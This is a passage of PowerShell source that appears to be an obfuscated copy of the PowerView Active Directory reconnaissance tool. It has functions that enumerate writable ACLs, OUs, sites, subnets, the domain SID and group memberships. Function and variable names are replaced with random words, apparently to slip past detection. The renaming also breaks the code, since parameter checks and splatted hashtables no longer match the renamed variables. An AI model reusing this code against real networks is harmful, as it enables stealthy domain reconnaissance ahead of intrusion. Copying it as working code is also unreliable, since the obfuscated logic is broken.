            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {

                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($qXZSWJBK9oWXBpP[$_.SecurityIdentifier.Value]) {
                        $xzPLZipmG9zEpwl, $ZO99oBXxxlSDvGm, $9ZshodnERKauf9u, $CqOZGaKjCwNTeVV = $qXZSWJBK9oWXBpP[$_.SecurityIdentifier.Value]

                        $fdvfoCJ9B9gE9SG = New-Object PSObject
                        $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'AceType' $_.AceType
                        $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'IdentityReferenceName' $xzPLZipmG9zEpwl
                        $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'IdentityReferenceDomain' $ZO99oBXxxlSDvGm
                        $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'IdentityReferenceDN' $9ZshodnERKauf9u
                        $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'IdentityReferenceClass' $CqOZGaKjCwNTeVV
                        $fdvfoCJ9B9gE9SG
                    }
                    else {
                        $9ZshodnERKauf9u = intermediate -MhNmgElNMTxhWpJ $_.SecurityIdentifier.Value -nnLLVWbvFttZtjp DN @ADNameArguments


                        if ($9ZshodnERKauf9u) {
                            $ZO99oBXxxlSDvGm = $9ZshodnERKauf9u.SubString($9ZshodnERKauf9u.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

                            $NVVHymkRBXaCUZf['Domain'] = $ZO99oBXxxlSDvGm
                            $NVVHymkRBXaCUZf['Identity'] = $9ZshodnERKauf9u

                            $Object = ensnared @ObjectSearcherArguments

                            if ($Object) {
                                $xzPLZipmG9zEpwl = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $CqOZGaKjCwNTeVV = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $CqOZGaKjCwNTeVV = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $CqOZGaKjCwNTeVV = 'user'
                                }
                                else {
                                    $CqOZGaKjCwNTeVV = $Null
                                }


                                $qXZSWJBK9oWXBpP[$_.SecurityIdentifier.Value] = $xzPLZipmG9zEpwl, $ZO99oBXxxlSDvGm, $9ZshodnERKauf9u, $CqOZGaKjCwNTeVV

                                $fdvfoCJ9B9gE9SG = New-Object PSObject
                                $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'AceType' $_.AceType
                                $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'IdentityReferenceName' $xzPLZipmG9zEpwl
                                $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'IdentityReferenceDomain' $ZO99oBXxxlSDvGm
                                $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'IdentityReferenceDN' $9ZshodnERKauf9u
                                $fdvfoCJ9B9gE9SG | Add-Member NoteProperty 'IdentityReferenceClass' $CqOZGaKjCwNTeVV
                                $fdvfoCJ9B9gE9SG
                            }
                        }
                        else {
                            Write-Warning "[rumble] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with intermediate"
                        }
                    }
                }
            }
        }
    }
}


function Noelle {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $tT9bcwDtpzBQOMQ,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TTVRDqV9wSVspX9,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Alias('ReturnOne')]
        [Switch]
        $Fdx99xLobbqBPcQ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{}
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Properties']) { $tHAcROQOWB9HdRG['Properties'] = $wDpWXLYTGZrAWN9 }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['SecurityMasks']) { $tHAcROQOWB9HdRG['SecurityMasks'] = $TTVRDqV9wSVspX9 }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
        $ZH9AqppeMzu99Km = cackles @SearcherArguments
    }

    PROCESS {
        if ($ZH9AqppeMzu99Km) {
            $9pNjjurFRb9jpSJ = ''
            $9QyouHvxMZKCIKN = ''
            $MhNmgElNMTxhWpJ | Where-Object {$_} | ForEach-Object {
                $isYmprKvwrxUsJW = $_.Replace('(', '\28').Replace(')', '\29')
                if ($isYmprKvwrxUsJW -match '^OU=.*') {
                    $9pNjjurFRb9jpSJ += "(distinguishedname=$isYmprKvwrxUsJW)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {


                        $bbGfPzUehrfQybT = $isYmprKvwrxUsJW.SubString($isYmprKvwrxUsJW.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Noelle] Extracted domain '$bbGfPzUehrfQybT' from '$isYmprKvwrxUsJW'"
                        $tHAcROQOWB9HdRG['Domain'] = $bbGfPzUehrfQybT
                        $ZH9AqppeMzu99Km = cackles @SearcherArguments
                        if (-not $ZH9AqppeMzu99Km) {
                            Write-Warning "[Noelle] Unable to retrieve domain searcher for '$bbGfPzUehrfQybT'"
                        }
                    }
                }
                else {
                    try {
                        $bgaRJRRuWyecMST = (-Join (([Guid]$isYmprKvwrxUsJW).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $9pNjjurFRb9jpSJ += "(objectguid=$bgaRJRRuWyecMST)"
                    }
                    catch {
                        $9pNjjurFRb9jpSJ += "(name=$isYmprKvwrxUsJW)"
                    }
                }
            }
            if ($9pNjjurFRb9jpSJ -and ($9pNjjurFRb9jpSJ.Trim() -ne '') ) {
                $9QyouHvxMZKCIKN += "(|$9pNjjurFRb9jpSJ)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Noelle] Searching for OUs with $tT9bcwDtpzBQOMQ set in the gpLink property"
                $9QyouHvxMZKCIKN += "(gplink=*$tT9bcwDtpzBQOMQ*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Noelle] Using additional LDAP filter: $RmrzVOkRggEzAyC"
                $9QyouHvxMZKCIKN += "$RmrzVOkRggEzAyC"
            }

            $ZH9AqppeMzu99Km.filter = "(&(objectCategory=organizationalUnit)$9QyouHvxMZKCIKN)"
            Write-Verbose "[Noelle] Noelle filter string: $($ZH9AqppeMzu99Km.filter)"

            if ($PSBoundParameters['FindOne']) { $xSLNEIXByfNTAdG = $ZH9AqppeMzu99Km.FindOne() }
            else { $xSLNEIXByfNTAdG = $ZH9AqppeMzu99Km.FindAll() }
            $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {

                    $OU = $_
                }
                else {
                    $OU = hoaxer -wDpWXLYTGZrAWN9 $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($xSLNEIXByfNTAdG) {
                try { $xSLNEIXByfNTAdG.dispose() }
                catch {
                    Write-Verbose "[Noelle] Error disposing of the Results object: $_"
                }
            }
            $ZH9AqppeMzu99Km.dispose()
        }
    }
}


function fourteenths {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $tT9bcwDtpzBQOMQ,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TTVRDqV9wSVspX9,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Alias('ReturnOne')]
        [Switch]
        $Fdx99xLobbqBPcQ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Properties']) { $tHAcROQOWB9HdRG['Properties'] = $wDpWXLYTGZrAWN9 }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['SecurityMasks']) { $tHAcROQOWB9HdRG['SecurityMasks'] = $TTVRDqV9wSVspX9 }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
        $tZZFQ9tAfNUEUuP = cackles @SearcherArguments
    }

    PROCESS {
        if ($tZZFQ9tAfNUEUuP) {
            $9pNjjurFRb9jpSJ = ''
            $9QyouHvxMZKCIKN = ''
            $MhNmgElNMTxhWpJ | Where-Object {$_} | ForEach-Object {
                $isYmprKvwrxUsJW = $_.Replace('(', '\28').Replace(')', '\29')
                if ($isYmprKvwrxUsJW -match '^CN=.*') {
                    $9pNjjurFRb9jpSJ += "(distinguishedname=$isYmprKvwrxUsJW)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {


                        $bbGfPzUehrfQybT = $isYmprKvwrxUsJW.SubString($isYmprKvwrxUsJW.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[fourteenths] Extracted domain '$bbGfPzUehrfQybT' from '$isYmprKvwrxUsJW'"
                        $tHAcROQOWB9HdRG['Domain'] = $bbGfPzUehrfQybT
                        $tZZFQ9tAfNUEUuP = cackles @SearcherArguments
                        if (-not $tZZFQ9tAfNUEUuP) {
                            Write-Warning "[fourteenths] Unable to retrieve domain searcher for '$bbGfPzUehrfQybT'"
                        }
                    }
                }
                else {
                    try {
                        $bgaRJRRuWyecMST = (-Join (([Guid]$isYmprKvwrxUsJW).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $9pNjjurFRb9jpSJ += "(objectguid=$bgaRJRRuWyecMST)"
                    }
                    catch {
                        $9pNjjurFRb9jpSJ += "(name=$isYmprKvwrxUsJW)"
                    }
                }
            }
            if ($9pNjjurFRb9jpSJ -and ($9pNjjurFRb9jpSJ.Trim() -ne '') ) {
                $9QyouHvxMZKCIKN += "(|$9pNjjurFRb9jpSJ)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[fourteenths] Searching for sites with $tT9bcwDtpzBQOMQ set in the gpLink property"
                $9QyouHvxMZKCIKN += "(gplink=*$tT9bcwDtpzBQOMQ*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[fourteenths] Using additional LDAP filter: $RmrzVOkRggEzAyC"
                $9QyouHvxMZKCIKN += "$RmrzVOkRggEzAyC"
            }

            $tZZFQ9tAfNUEUuP.filter = "(&(objectCategory=site)$9QyouHvxMZKCIKN)"
            Write-Verbose "[fourteenths] fourteenths filter string: $($tZZFQ9tAfNUEUuP.filter)"

            if ($PSBoundParameters['FindOne']) { $xSLNEIXByfNTAdG = $tZZFQ9tAfNUEUuP.FindAll() }
            else { $xSLNEIXByfNTAdG = $tZZFQ9tAfNUEUuP.FindAll() }
            $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {

                    $Site = $_
                }
                else {
                    $Site = hoaxer -wDpWXLYTGZrAWN9 $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($xSLNEIXByfNTAdG) {
                try { $xSLNEIXByfNTAdG.dispose() }
                catch {
                    Write-Verbose "[fourteenths] Error disposing of the Results object"
                }
            }
            $tZZFQ9tAfNUEUuP.dispose()
        }
    }
}


function stingiest {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [ValidateNotNullOrEmpty()]
        [String]
        $SmSMWEXMkNVoOuD,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TTVRDqV9wSVspX9,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Alias('ReturnOne')]
        [Switch]
        $Fdx99xLobbqBPcQ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Properties']) { $tHAcROQOWB9HdRG['Properties'] = $wDpWXLYTGZrAWN9 }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['SecurityMasks']) { $tHAcROQOWB9HdRG['SecurityMasks'] = $TTVRDqV9wSVspX9 }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
        $Gis9ukIlbPycaxz = cackles @SearcherArguments
    }

    PROCESS {
        if ($Gis9ukIlbPycaxz) {
            $9pNjjurFRb9jpSJ = ''
            $9QyouHvxMZKCIKN = ''
            $MhNmgElNMTxhWpJ | Where-Object {$_} | ForEach-Object {
                $isYmprKvwrxUsJW = $_.Replace('(', '\28').Replace(')', '\29')
                if ($isYmprKvwrxUsJW -match '^CN=.*') {
                    $9pNjjurFRb9jpSJ += "(distinguishedname=$isYmprKvwrxUsJW)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {


                        $bbGfPzUehrfQybT = $isYmprKvwrxUsJW.SubString($isYmprKvwrxUsJW.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[stingiest] Extracted domain '$bbGfPzUehrfQybT' from '$isYmprKvwrxUsJW'"
                        $tHAcROQOWB9HdRG['Domain'] = $bbGfPzUehrfQybT
                        $Gis9ukIlbPycaxz = cackles @SearcherArguments
                        if (-not $Gis9ukIlbPycaxz) {
                            Write-Warning "[stingiest] Unable to retrieve domain searcher for '$bbGfPzUehrfQybT'"
                        }
                    }
                }
                else {
                    try {
                        $bgaRJRRuWyecMST = (-Join (([Guid]$isYmprKvwrxUsJW).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $9pNjjurFRb9jpSJ += "(objectguid=$bgaRJRRuWyecMST)"
                    }
                    catch {
                        $9pNjjurFRb9jpSJ += "(name=$isYmprKvwrxUsJW)"
                    }
                }
            }
            if ($9pNjjurFRb9jpSJ -and ($9pNjjurFRb9jpSJ.Trim() -ne '') ) {
                $9QyouHvxMZKCIKN += "(|$9pNjjurFRb9jpSJ)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[stingiest] Using additional LDAP filter: $RmrzVOkRggEzAyC"
                $9QyouHvxMZKCIKN += "$RmrzVOkRggEzAyC"
            }

            $Gis9ukIlbPycaxz.filter = "(&(objectCategory=subnet)$9QyouHvxMZKCIKN)"
            Write-Verbose "[stingiest] stingiest filter string: $($Gis9ukIlbPycaxz.filter)"

            if ($PSBoundParameters['FindOne']) { $xSLNEIXByfNTAdG = $Gis9ukIlbPycaxz.FindOne() }
            else { $xSLNEIXByfNTAdG = $Gis9ukIlbPycaxz.FindAll() }
            $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {

                    $vmFfCIyxKWyra9J = $_
                }
                else {
                    $vmFfCIyxKWyra9J = hoaxer -wDpWXLYTGZrAWN9 $_.Properties
                }
                $vmFfCIyxKWyra9J.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')

                if ($PSBoundParameters['SiteName']) {


                    if ($vmFfCIyxKWyra9J.properties -and ($vmFfCIyxKWyra9J.properties.siteobject -like "*$SmSMWEXMkNVoOuD*")) {
                        $vmFfCIyxKWyra9J
                    }
                    elseif ($vmFfCIyxKWyra9J.siteobject -like "*$SmSMWEXMkNVoOuD*") {
                        $vmFfCIyxKWyra9J
                    }
                }
                else {
                    $vmFfCIyxKWyra9J
                }
            }
            if ($xSLNEIXByfNTAdG) {
                try { $xSLNEIXByfNTAdG.dispose() }
                catch {
                    Write-Verbose "[stingiest] Error disposing of the Results object: $_"
                }
            }
            $Gis9ukIlbPycaxz.dispose()
        }
    }
}


function storming {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    $tHAcROQOWB9HdRG = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
    if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
    if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }

    $DCSID = eigenvalues @SearcherArguments -Fdx99xLobbqBPcQ | Select-Object -First 1 -ExpandProperty objectsid

    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[storming] Error extracting domain SID for '$pkMxgDCVHqOym9m'"
    }
}


function offenses {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $DLxbUKVxTLgnbyW,

        [Switch]
        $SkNLjyYBJxqKTQ9,

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $HQrq9IrZOGRVsXk,

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $AzLXclmrdtRRiqI,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TTVRDqV9wSVspX9,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Alias('ReturnOne')]
        [Switch]
        $Fdx99xLobbqBPcQ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{}
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Properties']) { $tHAcROQOWB9HdRG['Properties'] = $wDpWXLYTGZrAWN9 }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['SecurityMasks']) { $tHAcROQOWB9HdRG['SecurityMasks'] = $TTVRDqV9wSVspX9 }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
        $Q9ivyRQLJwyAFrk = cackles @SearcherArguments
    }

    PROCESS {
        if ($Q9ivyRQLJwyAFrk) {
            if ($PSBoundParameters['MemberIdentity']) {

                if ($tHAcROQOWB9HdRG['Properties']) {
                    $BKCcLbrvfbNIi9U = $tHAcROQOWB9HdRG['Properties']
                }

                $tHAcROQOWB9HdRG['Identity'] = $DLxbUKVxTLgnbyW
                $tHAcROQOWB9HdRG['Raw'] = $True

                ensnared @SearcherArguments | ForEach-Object {

                    $eG9OhcnU9QmIsCR = $_.GetDirectoryEntry()


                    $eG9OhcnU9QmIsCR.RefreshCache('tokenGroups')

                    $eG9OhcnU9QmIsCR.TokenGroups | ForEach-Object {

                        $rw9Og9dlrX9Xq9c = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value


                        if ($rw9Og9dlrX9Xq9c -notmatch '^S-1-5-32-.*') {
                            $tHAcROQOWB9HdRG['Identity'] = $rw9Og9dlrX9Xq9c
                            $tHAcROQOWB9HdRG['Raw'] = $False
